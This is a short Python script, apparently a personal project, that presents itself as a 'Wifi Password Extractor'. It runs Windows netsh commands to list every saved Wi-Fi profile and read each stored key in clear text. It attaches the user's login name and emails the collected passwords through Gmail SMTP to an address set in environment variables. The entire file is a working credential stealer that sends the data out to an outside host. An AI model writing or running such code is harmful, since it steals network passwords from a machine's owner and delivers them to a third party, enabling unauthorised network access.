import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

# config for getting secrets from env
import os
from dotenv import load_dotenv

load_dotenv()
# config ends

# cauz i am using gmail
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()

server.ehlo()

server.login(os.getenv("Email"), os.getenv("Password"))

msg = MIMEMultipart()
msg["From"] = "Your Wifi Password Extractor"
msg["To"] = "Mohammed Mubashir Hasan"
msg["Subject"] = "Wifi Passwords"

# getting device info
import os

msg.attach(MIMEText(os.getlogin()))

# now to the wifi extracting stuff
import subprocess

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')


wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]

for wifi in wifis:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('utf-8').split(
        '\n')
    results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]
    try:
        msg.attach(MIMEText(f'Name:{wifi}, Password={results[0]}'))
    except IndexError:
        msg.attach(MIMEText(f'Name:{wifi}, Password= Cannot be read'))

text= msg.as_string()
server.sendmail(os.getenv("Email"), os.getenv("SendEmail"), text)
